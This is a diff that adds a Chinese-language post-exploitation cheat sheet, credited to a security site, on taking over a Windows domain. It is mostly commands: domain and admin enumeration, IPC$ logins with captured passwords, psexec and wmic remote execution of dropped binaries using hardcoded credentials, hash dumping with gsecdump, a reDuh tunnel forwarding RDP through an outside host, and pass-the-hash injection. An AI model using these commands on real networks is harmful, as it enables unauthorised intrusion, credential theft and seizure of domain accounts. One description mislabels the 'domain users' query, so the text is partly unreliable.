@@ -1,0 +1,83 @@
+1.有了内网.我们建立SOCKS或者VPN是很有必要的
+
+2.一旦拥有密码，我们就可以尝试IPC连接，直接拿下域，这就得看你们的权限有多大。
+net use \\IP\ipc$ password /user:username@domain
+
+3.常用命令
+
+    net view
+
+    查看同一域/工作组的计算机列表
+
+    net view /domain
+
+    查看域/工作组列表
+
+     net view /domain:Secwing
+
+    查看Secwing域中 计算机列表
+
+    net group /domain
+
+    查看所在域的组
+
+    net user /domain
+
+    查看所在域用户
+
+    net user /domain zerosoul 12345678
+
+    修改域用户密码，需要域管理员权限，或者Ctrl+Alt+Del点击修改则不需要域管理员权限
+
+    net localgroup administrators SECWING\zerosoul /add
+
+    域Users组用户添加到本地Administrators组，需要本地管理员或域管理员在本机登陆域后进行
+
+    下面的命令 只能用于 域控制器:
+
+    net group "Domain controllers"
+
+    查看域控制器(如果有多台)
+
+    net group
+
+    查看域的组
+
+    net group "domain admins"
+
+    查看域管理员
+
+    net group "domain users"
+
+    查看域管理员
+
+    PS:打开配置域控制器向导的命令
+
+    dcpromo
+
+    psexec /accepteula 绕过第一次验证窗口
+
+    mstsc/admin 解决hash无法抓出问题
+
+    wmic /node:172.16.19.96 /user:ABIMAQ\Administrator /password:k78m90 process call create c:\kav\2009.exe
+
+    psexec.exe -s -u administrator -p k78m90 \\172.16.16.2 -c c:\kav\2009.exe 拷贝文件并且执行
+
+    psexec.exe -s -u administrator -p km3h7i \\172.16.16.2 -c c:\kav\gsecdump.exe -u 抓取hash
+
+    net use \\172.16.16.2\IPC$ "k78m90" /user:"admintitrator"
+
+    net use \\172.16.16.2\IPC$ "k78m90" /user:"aABIMAQ\Administrator"
+
+    net time \\172.16.16.2
+
+    at \\172.16.16.2 13:50 2009.exea
+
+    java reDuhClient fdc1.cnhan.com http 80 /admin/reduh.aspx reduh连接命令
+
+    [createTunnel]1234:127.0.0.1:3389 端口转向命令
+    iam-alt -h user-hash 这样hash就被注入了
+
+    whosthere-alt.exe 来查看是否被注入成功。
+
+本文来源：华西安全网[http://www.hx99.net]
